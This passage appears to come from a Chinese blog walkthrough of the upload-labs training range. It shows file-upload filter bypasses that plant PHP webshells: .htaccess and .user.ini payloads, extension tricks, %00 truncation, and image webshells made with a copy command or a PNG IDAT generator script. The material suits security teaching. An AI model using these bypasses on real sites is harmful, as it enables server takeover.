src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20211028181237168.png"></p><h3 id="3–黑名单之php3"><a href="#3–黑名单之php3" class="headerlink" title="3–黑名单之php3"></a>3–黑名单之php3</h3><p>这关在服务器端进行了黑名单限制，如果匹配到了黑名单中的文件类型就会拒绝本次上传。</p><p>而黑名单最大的问题就是不全。我们的思路就是上传一个黑名单以外并包含php代码的文件，但又要使得我们访问该文时，该文件会被当作php文件类型解析。<code>php3</code>文件和<code>phtml</code>没有在黑名单中，而这两种文件往往也会被当作php文件来解析。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028183945.png"></p><p>我们可以把后缀改为<code>php3</code>或是<code>phtml</code>上传，上传成功。</p><p>但蚁剑却连接不了，说明<code>php</code>代码并没有生效，我们上传的文件很可能并没有被服务器当作<code>php</code>文件解析。</p><p>这是因为apache服务器的配置文件（httpd_conf）中没有进行相关设置，所以解析不了。所以说这个漏洞属于是网站管理人员配置文件时的失误。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028204830.png"></p><p>将配置文件中这一栏修改为</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029204603.png"></p><p>意思让服务器将<code>php3</code>类型的文件当作<code>php</code>类型来解析。</p><h3 id="4–特殊文件之-htaccess配置文件"><a href="#4–特殊文件之-htaccess配置文件" class="headerlink" title="4–特殊文件之.htaccess配置文件"></a>4–特殊文件之.htaccess配置文件</h3><p>这关看提示，过滤了很多的文件类型。<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028193733.png"></p><p>但是没有过滤掉<code>.htaccess</code>。<strong>注意：当服务器是apache时才有作用</strong></p><p><em><code>.htaccess</code>文件(或者”分布式配置文件”），全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</em></p><p>我们就可以利用<code>.htaccess</code>文件的特性，上传一个具有目的性的<code>.htaccess</code>文件。创建一个txt文件，其内容如下，再将文件名改为.htaccess。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br></code></pre></div></td></tr></table></figure><p><strong>注意是文件名就为<code>.htaccess</code></strong></p><p>这个文件的意思是让服务器将所有的文件都当作<code>php</code>文件来解析。</p><p>这样的话我们上传一个包含<code>php</code>代码且类型不在黑名单中的就行了。（为了方便验证，所以上传的是包含phpinfo()函数的<code>php</code>文件）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030105921.png"></p><p>可以看出访问.png类型的文件时，服务器依然按照<code>php</code>文件解析，证明我们成功了。</p><p>另外上传<code>.htaccess</code>文件对这关配置文件<code>httpd_conf</code>文件也有要求，需要apache加载rewrite模块和允许重写。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030110424.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030110509.png"></p><p>除了上传.htaccess之外，还可以针对apache的解析机制绕过黑名单的检测。</p><p>Apache会将不认识的后缀，如muma.php.xxx.helloworld、test.php.iii等从右向左解析，不认识就往左移一个，最终移到<code>php</code>时apache认识了就会将该文件当作<code>php</code>文件来解析。</p><p>所以我们还可以上传一个文件后缀为.<code>php</code>.xxxx的木马。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211028210833.png"></p><p>同时请注意：这需要前文中提到的配置文件<code>httpd_conf</code>中同样的地方，将最前面的#号注释符删去才会生效，如下图</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211029224135.png"></p><h3 id="5–特殊文件之-user-ini配置文件"><a href="#5–特殊文件之-user-ini配置文件" class="headerlink" title="5–特殊文件之.user.ini配置文件"></a>5–特殊文件之.user.ini配置文件</h3><p>这关告诉了我们上传目录中存在着一个<code>php</code>文件以及该文件的名字。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030140412.png"></p><p>我们可以上传.user.ini文件，其内容如下</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file=info.jpg<br><span class="hljs-comment">//info.jpg是我们即将上传的包含php代码的文件</span><br></code></pre></div></td></tr></table></figure><p>从名字大概可以看出这个<code>.user.ini</code>文件是个用户自定义的配置文件，和上一关的<code>.htaccess</code>好像有些像。他们的特点可以参考下面这篇文章<a href="https://blog.csdn.net/since_2020/article/details/113781120?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">.htaccess文件和.user.ini文件_since_2020的博客-CSDN博客_user.ini是什么</a></p><p>简单来说，可以借助<code>.user.ini</code>让所有<code>php</code>文件都“自动”包含某个文件，而这个文件可以是一个正常<code>php</code>文件，也可以是包含着<code>php</code>代码的非<code>php</code>文件。所以我们上传一个包含<code>php</code>代码的<code>jpg</code>文件，再访问站点中的一个<code>php</code>文件时，服务器在执行这个<code>php</code>文件时会自动包含并执行我们所上传的文件。（这和文件包含漏洞是类似的效果）而这个<code>php</code>文件即提示中的<code>readme.php</code>。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030150849.png"></p><p>这样当我们访问某一个<code>php</code>文件时，自动执行了我们所上传的文件中的<code>php</code>代码。</p><p>另外值得注意的是，这种配置文件好像是有缓存的。当我第一次上传<code>.user.ini</code>文件后，这个<code>.user.ini</code>文件中的内容会管用很长一段时间，哪怕我在服务器端删除了这个<code>.user.ini</code>或上传一个新的<code>.user.ini.</code>都不会立刻生效，还是原来的<code>.user.ini</code>在起作用。</p><p>另外这一关我未能在低版本的环境中复现成功，也许是<code>php</code>或apache版本不对，也许是某个配置文件不对，总之换了一个环境才成功的。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211030152156.png"></p><h3 id="6–黑名单之大小写"><a href="#6–黑名单之大小写" class="headerlink" title="6–黑名单之大小写"></a>6–黑名单之大小写</h3><p>通常文件上传的源码中会有很多限制文件后缀的函数，经过这些限制再结合黑名单检测，就可能阻止恶意文件（如<code>php</code>类型）上传。</p><p>黑名单需要全面考虑到才算安全，而全面考虑到几乎不可能，所谓智者千虑，必有一失。所以我们还要结合别的方式来防御，例如利用函数限制文件后缀。在这个靶场里即一些<code>php</code>自带的函数+作者创建的自定义函数。</p><p>从第6关开始接下来几关都是源码文件中漏掉了一两个函数，针对这几个漏掉的函数，我们就可以来构造<code>php</code>后缀名进行绕过。</p><p>先来看看一个较为全面的函数限制：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210921.png"></p><p>上面的步骤进行了以下操作：去除文件前后的空格，去除文件末尾的<code>.</code>，从右往左截取第一个.后面的字符串（截取文件的后缀），并将其转化为小写，去除字符串<code>::$data</code>，去除文件后的空格。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124222954.png"></p><p><strong>接着按照这里的源码规则，我们上传的文件后缀经过这些函数的转换，并通过黑名单检测以后作为新的后缀储存在服务器中。也就是说我们构造的文件后缀不仅需要通过黑名单检测，还需要使其转化后能被解析为<code>php</code>类型的文件，这与第8，10关不同，先在此强调以作对比</strong></p><p>直接来看这几个限制的函数可能会有点奇怪，通过下面几个关卡我们就知道如果没有这些限制的话，我们就能采取哪些方法绕过了。所以大部分文件上传点都会写很多限制函数。</p><p>至于第6关</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106163644.png"></p><p>这关黑名单黑名单忽略了大小写绕过，所以上传后缀为<code>Php</code>的就行了。</p><h3 id="7–黑名单之空格"><a href="#7–黑名单之空格" class="headerlink" title="7–黑名单之空格"></a>7–黑名单之空格</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106164049.png"></p><p>因为没有去掉文件末尾的空格，这关可以采用添加空格绕过，上传后缀为<code>.</code>php<code>  </code>+一个空格即可，这样就匹配不到黑名单中的<code>php</code>了。同时该形式的文件在服务器上能被解析为<code>php</code>格式。</p><h3 id="8–黑名单之忽略后缀型-（1）"><a href="#8–黑名单之忽略后缀型-（1）" class="headerlink" title="8–黑名单之忽略后缀型.（1）"></a>8–黑名单之忽略后缀型.（1）</h3><p>因为这里未用deldot函数来删除文件名末尾的点 ，我们可以上传<code>xx.</code>php<code>.</code>文件。截取的后缀为空，匹配不到黑名单。而如果按照前面几关的规则，我们上传的文件会被储存为<code>xx.</code>，因为我们的后缀变成了<code>.</code>。但是这关服务器在储存文件时与前面不同，这里是保留了原文件名（进行了一两步转化）进行储存，变成了<code>xx.php.</code>，我把这称为忽略后缀型的绕过黑名单，第十关也是这样。关于这点我将在第10关的部分详细展开。<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124223928.png"></p><p>最后解析的时候利用了windows的特性，文件名最后的<code>.</code>会被忽略，所以<code>xx.</code>php<code>.</code>会被当作<code>xx.php</code>来解析。如果服务器是Linux的话就不会生效了。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106164737.png"></p><p>另外这关依旧存在apache的解析漏洞，之前提到的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210525.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211102210548.png"></p><h3 id="9–黑名单之windows特性-data"><a href="#9–黑名单之windows特性-data" class="headerlink" title="9–黑名单之windows特性::$data"></a>9–黑名单之windows特性::$data</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106165058.png"></p><p>这关在文件名后面加上<code>::$data</code>，构成<code>xx.php::$data</code>即可。（蚁剑连接的时候删掉后面的::$data)</p><p>这同样是针对windos系统特性的方法。</p><p>如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，这项操作的目的就是使windows主机不检查后缀名。</p><h3 id="10–黑名单之忽略后缀型-（2）"><a href="#10–黑名单之忽略后缀型-（2）" class="headerlink" title="10–黑名单之忽略后缀型.（2）"></a>10–黑名单之忽略后缀型.（2）</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124222313.png"></p><p>提醒：<strong>这部分我写的有点多，其实只要仔细分析源码就会明白了。</strong></p><p>这关的限制函数可以说是最全面了，前面几关没有的函数它都有了，但我们可以针对源码构造<code>xx.php. .</code>绕过。</p><p>根据源码，首先创建一个变量等于文件名<code>xx.php. .</code>，然后去除末尾的点，变为<code>xx.php.空格</code>再创建一个变量等于其从右往左第一个点后面的值，即为<code>.空格</code>，转为小写，不变，去除<code>::$DATA</code>，不变，去除空格，变为了<code>.</code>，这不会与黑名单中的<code>.xx</code>匹配。但显然这个结果<code>.</code>是不可能作为后缀使得文件解析成<code>php</code>的。</p><p>因为如果按照前几关的源码，在服务中会被储存为<code>xx.</code>，整个后缀都没有了，连<code>php</code>字段都丢掉了。事实上在6、7和9关上传<code>xx.php. .</code>文件的确只会得到这个结果。</p><p>而第十关不同点在这里：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124223928.png"></p><p>（顺便贴一下6、7和9关以作对比）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20220124223950733.png"></p><p>区别就在$img_path，这也就是服务器储存的文件名。一个是上传路径+结合时间的随机数字+转化后的后缀（只体现了变量$file_ext的转化），一个是上传路径+原文件名（也就是只体现了变量 $file_name所经过的转化 ，不体现变量$file_ext的转化）</p><p>也就是说对于第10关，网站的防御做了以下行为：</p><p>去除文件名后空格，去除文件后面的点，经过这两步转化后的原文件名作为变量 <code>$file_name </code>，我们把这个变量放在一旁暂且不管。</p><p>然后截取了我们上传的文件后缀，对其进行了一系列转化（转小写，去空格….），作为新后缀进行黑名单匹配，通过检测并成功上传后，服务器中存储的文件名就是我们所构造的文件名(只做了两步转化，不是后面后缀经历的转化),即之前得到的变量 <code>$file_name </code>。而后缀转化成了什么样子根本没关注了，只需要通过黑名单检测即可。</p><p>我们构造的<code>xx.php. .</code>，经过两步转化在服务器端的就储存成了<code>xx.php.空格  </code>。又因为windos的特性，文件后面的空格和点都会被忽略变成了<code>xx.php</code>，即可被执行。</p><p>而6、7和9关中，我们所关心的后缀变成了转化后的<code>.</code>，所以拼接的时候是xxx+一个点，是没有后缀<code>php</code>的，也就解析不了。</p><p>相比之下6、7和9在<code> $img_path</code> 这里的储存更为严格，生成一个新的文件名，使用通过黑名单检测的后缀来作为后缀储存，而第10关只要截取的后缀通过了黑名单检测，就直接使用整个原文件名（只经过了两步的转化）来储存。</p><p>第10关就是利用这一点，构造出<code>xx.php. .</code>使得截取出一个假后缀<code>.</code>来通过黑名单检测，而其原文件名（经过一两步转化）又能被解析为<code>php</code>文件。</p><h3 id="11–黑名单之双写"><a href="#11–黑名单之双写" class="headerlink" title="11–黑名单之双写"></a>11–黑名单之双写</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106174416.png"></p><p>上面函数的意思是，若文件后缀中带有$deny_ext数组中的值，则会被替换为空，构造<code>xx.pphphp. .</code>，双写绕过。</p><p>可以看出这一个限制函数的出发点与之前不同，前面的关卡都是先用函数截取后缀，对你的文件后缀进行一些转化，然后进行黑名单匹配，如果匹配到了就拒绝上传，这里是没有用函数截取后缀，先直接对整个文件名（包括后缀）进行黑名单匹配，如果匹配到了就修改为空。（你都匹配到了为什么不直接拒绝上传啊🤔是怕误伤文件名带有<code>php</code>的嘛..）</p><h3 id="12–-00截断之get类型"><a href="#12–-00截断之get类型" class="headerlink" title="12–%00截断之get类型"></a>12–%00截断之get类型</h3><p>先看源码，这关变成了白名单限制，先定义了白名单内容jpg，png，gif，然后截取文件名最后一个点后面的所有内容（截取文件后缀），接着用函数判断文件后缀是否在白名单中，符合条件即上传。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220111230241.png"></p><p>突破的关键在于这一条语句:</p><p><code> $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>意思为将图片的储存地址设置为“save_path”+”/“+一个随机数+date+文件后缀。注意到这个”save_path”是用get方式请求得到的参数，结合这关的提示，我们可推测这关”save_path”即上传路径，且可以修改。即虽然我们无法在文件名上突破，但我们可以通过修改save_path这个参数来上传<code>php</code>文件。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220111233039.png"></p><p>在浏览器窗口中我们可以看到”save_path”的参数在这里<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125095622.png"></p><p>在数据包中我们可以看到”save_path”的参数在这里</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220111234431.png"></p><p>这里就需要利用到文件上传中的一个技术——“%00”截断。</p><p>需要注意的是，%00截断还有这两个要求；<br>（1）<code>php</code>版本必须小于5.3.4<br>（2）<code>php</code>的配置文件php-ini中，magic_quotes_gpc设置为Off</p><p>如果我们将这个”save_path”改为<code>../upload/shell.php%00</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220112002446.png"></p><p>即可实现上传<code>php</code>文件。</p><p>这项操作的原理就是，当拼接<code>save_path</code>与其它内容后，中间夹杂着<code>%00</code>，GET方式的<code>%00</code>会被服务器进行URL解码成<code>0x00</code>，而最后移动该文件储存时，会把其视为截止符，像汇编和c语言的规则一样。后面的内容被忽略，文件保留成xx.<code>php</code>。</p><p>（下图即为源码中移动文件的代码）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220112000953.png"></p><p>即save_path先被修改为<code>../upload/xx.php%00</code>，与其它东西拼接后形成了$img变量：<code>/upload/xx.php%00</code>+一段函数生成的数字（用来拼接的东西），而最后移动文件到该路径时，该路径被当作了：<code>/upload/xx.php</code>，%00后面的内容被忽略，最终我们成功上传的文件路径为<code>xx.php</code>，达成目的。</p><p>(可以看到文件最终被储存为了a.php)</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220112002011.png"></p><h3 id="13–-00截断之post类型"><a href="#13–-00截断之post类型" class="headerlink" title="13–%00截断之post类型"></a>13–%00截断之post类型</h3><p>这关我们的目的仍是在<code>save_path</code>，加上一个<code>0x00</code>。这关与第12关的区别就是<code>save_path</code>这个参数是用post类型来请求的，get与post一大区别就是浏览器会对get请求的数据进行url解码，而对post类型的数据不会。因为get类型的自动解码我们上传的是%00，而在上传post类型时我们添加的%00需要进行手动url解码，或是在二进制中进行修改<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125104533.png"></p><p>下面展示的是在数据包中对<code>save_path</code>后添加截断符</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125102524.png"></p><p>先添加%00，接着选中%00然后对其进行url解码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125102613.png"></p><p>得到的<code>0x00</code>字符不会显示出来</p><p>上传成功后我们复制图片链接地址会得到这样的数据</p><p><code>http://192.168.111.145/upload-labs-master/upload/eggs.php%EF%BF%BD/6820220125102724.jpg</code></p><p>其中<code>%EF%BF%BD</code>URL编码后的结果，后面的数字是源码中拼接文件路径时添加的内容。事实上,在这里我们上传的文件在服务器被储存为了<code>egg.php</code>，其之后的内容被截断了。用蚁剑链接时也是去掉后面的内容即可。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125103453.png"></p><h3 id="14–图片马之文件头检查"><a href="#14–图片马之文件头检查" class="headerlink" title="14–图片马之文件头检查"></a>14–图片马之文件头检查</h3><p>在14~17关中，我们通关上传图片马来达到上传木马文件的目的。与之前的不同，虽然关卡一直要求我们上传图片文件，但之前我们本质都是上传的包含木马的<code>php</code>文件，可以直接被服务器当作<code>php</code>代码执行的<code>php</code>文件。</p><p>而这里我们上传的是“具有图片格式”的图片，是不能直接被服务器当作<code>php</code>代码执行的。所以当我们上传了图片马后往往还需要利用另一个漏洞——文件包含漏洞，在作者强调的注意第二点这里可以看到。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220208154545.png"></p><p>文件包含漏洞：被<code>include</code> 和<code>require </code>函数引用的文件会被当作<code>php</code>文件来执行，当该文件含有恶意代码时即可造成危险。所以当我们成功上传了包含<code>php</code>代码的图片时，可以利用这个漏洞来执行。下面是这关中关于该漏洞的代码部分。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220208154652.png"></p><p>本关源码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217090345.png"></p><p>代码检查了文件的的前两个字节，现对数据包作如下修改：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217091657.png"></p><p>在这里添加gif98a,使其判断为gif文件。这样我们就成功在服务器端上传了一个gif类型的包含<code>php</code>代码的文件。</p><p>然后是我们利用文件包含漏洞的步骤：复制图片链接，然后根据指示跳转到文件包含漏洞界面，通过源码得知参数为<code>file</code>，在该页面url<code>.../include.php</code>处添加图片地址，根据其文件路径保留只uplod后面的部分，即<code>?file=upload/...jpg</code>即可使其<code>php</code>代码解析，用蚁剑连接时也用这个地址。下面是上传phpinfo()函数的实验结果。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217083359.png"></p><p>下面是另一种方法，利用cmd命令把<code>php</code>指令和一张常规图片合成一张新的图片，自然就得到了包含<code>php</code>木马的图片文件，检查文件头时符合要求，被当作<code>php</code>代码执行时也能发挥作用。</p><p>制作图片马：cmd cd /d切换工作目录到 进入图片所在路径</p><p>输入指令<code>copy egg.jpg/b+shell.php/a shell.jpg</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217073313.png"></p><p>有时新生成的图片能够正常打开而有时不能，经过我的测试这里中能正常打开的图片似乎不能使其中的<code>php</code>代码发挥作用。不过我看到别人的博客中是成功了的。我个人猜测可能是因为新生成的图片虽然包含了完整的<code>php</code>代码，但原本图片的数据残留使得<code>php</code>语法产生冲突导致<code>php</code>代码无法生效。</p><p>另外经过我的测试，执行<code> copy  x + y z</code>这个命令时，x如果是图片则z可以作为图片打开，y如果是图片则z不能作为图片打开。</p><p>其中/b是指以二进制方式打开，/a是以ascii方式打开，shell.jpg即为生成的图片马，在这张图片中藏有<code>php</code>代码，如果将该文件当作<code>php</code>代码执行即可实现其后门作用。</p><p>（也可以上传正常图片，同时用burpsuite抓包后直接在数据后添加<code>php</code>代码，这样也是在服务器端上传了一个包含<code>php</code>代码的图片马，此方法不再赘述。）</p><h3 id="15–图片马之getimagesize"><a href="#15–图片马之getimagesize" class="headerlink" title="15–图片马之getimagesize()"></a>15–图片马之getimagesize()</h3><p>这关提示我们使用了<code>getimagesize()</code>来检查是否是图片。<code>getimagesize()</code>的作用是读取目标图片的大小。即我们上传的图片需要具有图片“大小”的这个属性。而上一关中用cmd合成图片马可以得到正常打开的图片，即具备这样的属性。但就像上一关末尾我提到的一样，我个人尝试后一直不行。结合我之前的猜想，也许因为图片太复杂导致合成的图片数据太多影响<code>php</code>代码的生效。于是我截了个像素为60×60的图，以此代替之前的caat.jpg来作为合成图片木马的素材。·下面是两图属性对比。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220219233420.png"></p><p>重复之前的步骤，即合成，上传，访问漏洞页面</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220219233517.png"></p><p>竟然成功了。</p><h3 id="16–图片马之exif-imagetype"><a href="#16–图片马之exif-imagetype" class="headerlink" title="16–图片马之exif_imagetype()"></a>16–图片马之exif_imagetype()</h3><p>这关提示我们使用了exif_imagetype()函数来检查图片，该函数读取图像的第一个字节并检查其签名，用于确定图片类型。同样可以利用前文提到的cmd合成的图片马。根据前几次的经验，我总结出<strong>在cmd窗口使用copy命令合成图片时,前一位为图片且图片像素不宜过高。</strong></p><p>另外这关需要先在<code>php</code>配置文件（php.ini）中开启有关php_exif的设置。</p><p>重复之前步骤，成功。  </p><h3 id="17–图片马之二次渲染"><a href="#17–图片马之二次渲染" class="headerlink" title="17–图片马之二次渲染"></a>17–图片马之二次渲染</h3><p>二次渲染就是服务器会根据我们上传的图片再生成一张图片来储存。我们上传的原图片马末尾是有<code>php</code>代码的，而服务器对该图片进行二次渲染生成后，新生成图片的<code>php</code>代码是会被破坏掉的，且不同类型的图片二次渲染的方式不一样。其中gif的二次渲染绕过比较简单，用16进制的编辑器分别打开原图片木马和二次渲染后新生成的图片，找出其中一样的地方，然后把<code>php</code>代码写在这里即可。</p><p>详细步骤：</p><p>上传GIF图片，并再下载上传后的图片。</p><p>然后用16进制编辑器打开这两张图片(我这里用的是winhex)，找到一片数据相同处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220223214931.png"></p><p>将<code>php</code>代码插在中间</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220223215711.png"></p><p>重新上传，验证</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220223215759.png"></p><p>而png和jpg的有些复杂，不过都可以利用别人写好的脚本来实现绕过，详见：<a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析 - 先知社区 (aliyun.com)</a></p><p><em>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们。</em></p><p><em>IDAT:<br>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。<br>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</em></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//png制作脚本，原理：写入IDAT数据块</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 